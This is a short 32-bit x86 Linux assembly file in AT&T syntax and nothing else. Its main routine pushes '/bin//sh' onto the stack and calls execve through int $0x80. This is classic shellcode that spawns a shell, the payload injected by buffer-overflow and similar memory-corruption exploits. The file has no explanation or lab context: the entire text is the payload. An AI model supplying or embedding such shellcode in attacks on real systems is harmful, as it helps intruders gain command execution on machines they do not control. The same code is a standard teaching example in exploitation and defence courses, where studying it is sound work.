	.global main
	.text
main:
	xor %eax, %eax
	pushl %eax
	pushl $0x68732f2f
	pushl $0x6e69622f
	movl %esp, %ebx
	pushl %eax
	pushl %ebx
	movl %esp, %ecx
	movb $0xb, %al
	int $0x80
	
	
	
